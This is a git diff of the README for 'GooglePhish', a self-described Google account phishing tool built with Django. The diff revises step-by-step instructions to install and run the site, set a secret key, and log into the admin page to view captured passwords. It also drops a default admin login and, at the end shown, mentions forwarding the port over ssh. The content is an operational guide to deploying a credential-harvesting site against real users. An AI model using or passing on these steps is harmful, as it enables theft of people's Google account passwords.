@@ -1,5 +1,46 @@
 # GooglePhish
-- Google Account Phishing Tool
+- Google Account Phishing Tool using Python Django Framework.
+
+## Installation
+- Clone/Download repo
+    ```bash
+    git clone https://github.com/dmdhrumilmistry/GooglePhish.git
+    ```
+
+- Install requirements
+    ```bash
+    python3 -m pip install -r requirements.txt
+    ```
+
+- Check for errors
+    ```bash
+    python3 manage.py check
+    ```
+    > Proceed if no errors were encountered.
+
+- migrate db
+    ```bash
+    python3 manage.py makemigrations
+    python3 manage.py migrate
+    ```
+
+- Create user
+    ```bash
+    python3 manage.py createsuperuser
+    ```
+    
+- Collect static files
+    ```bash
+    python3 manage.py collectstatic
+    ```
+
+- Run server
+    ```bash
+    python3 manage.py runserver
+    ```
+
+    > Use `--insecure` tag if any issue is encountered while loading static files.
+
 
 ## Generate and update new random key before using GooglePhish
 -  Generate and copy new key
@@ -12,33 +53,11 @@
     SECRET_KEY = 'your_new_key'
   ```
   
-## Admin Page
-- login page 
-    ```url
+## View Passwords using Admin Page
+- admin login page 
+    ```
     http://127.0.0.1:8000/admin
     ``` 
-    > `Note` : It is recommended to change default admin page url.  
-    > 
-    > ***Default Login Details***  
-    > `username` :  admin  
-    > `password` : googlephish  
-
-
-## Create new admin user to view passwords
-
-- Create user
-    ```bash
-    python3 manage.py createsuperuser
-    ```
-- migrate db
-    ```bash
-    python3 manage.py makemigrations
-    python3 manage.py migrate
-    ```
-- run server
-    ```bash
-    python3 manage.py runserver
-    ```
 
 ## Start Server
 ```bash
@@ -53,7 +72,7 @@ python3 manage.py runserver
 
 - Start server
     ```bash
-    python3 manage.py --insecure
+    python3 manage.py runserver
     ```
 
 - forward port using ssh
